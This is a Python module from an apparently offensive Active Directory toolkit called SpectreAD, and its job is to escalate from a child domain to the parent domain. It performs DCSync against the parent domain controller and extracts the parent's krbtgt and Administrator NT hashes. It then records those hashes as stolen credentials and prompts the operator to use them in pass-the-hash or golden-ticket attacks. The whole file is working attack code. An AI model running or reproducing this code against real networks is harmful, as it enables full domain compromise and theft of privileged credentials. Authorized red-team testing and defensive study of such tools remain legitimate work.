"""
SpectreAD :: core/raisechild.py
Child domain -> parent domain via DCSync on the parent.

Author : Inayat Hussain
"""

from __future__ import annotations

from core import ui
from core.creds import resolve
from core.store import open_store


def run(args) -> None:
    with open_store(args.store) as store:
        cred = resolve(args, store)
        child = args.domain
        parent = args.parent or ".".join(child.split(".")[1:])
        if not parent:
            ui.die("cannot infer parent — pass -parent")

        ui.card("raise child", [
            ("child", child),
            ("parent", parent),
            ("parent dc", args.parent_dc),
            ("path", "child DA -> DCSync parent -> krbtgt"),
        ])
        if args.dry_run:
            return

        from core.dcsync import _Sink, _inprocess, _subprocess

        sink = _Sink(store, parent, args.out_dir)
        args.dc_ip = args.parent_dc
        if not _inprocess(parent, args.parent_dc, cred, sink, args):
            _subprocess(parent, args.parent_dc, cred, sink, args)
        sink.flush()

        krbtgt = next((l for l in sink.ntds if l.lower().startswith("krbtgt:")), None)
        admin = next((l for l in sink.ntds if l.lower().startswith("administrator:")), None)
        if not krbtgt or not admin:
            ui.fail("krbtgt or administrator missing — is the child account a parent DA?")
            return

        krbtgt_nt = krbtgt.split(":")[3]
        admin_nt = admin.split(":")[3]
        store.set_meta("parent_krbtgt", krbtgt_nt)
        store.set_meta("parent_admin", admin_nt)
        store.add_cred(parent, "Administrator", f":{admin_nt}", "hash", "raisechild", True)
        store.add_owned("Administrator", "raisechild")

        ui.ok(f"parent krbtgt: {krbtgt_nt}")
        ui.ok(f"parent Administrator: {admin_nt}")
        ui.edge("use -H :<admin_nt> against the parent, or forge a golden ticket")
        store.add_finding("critical", "Parent domain compromised", f"{parent} via {child}",
                          cred=cred.identity())
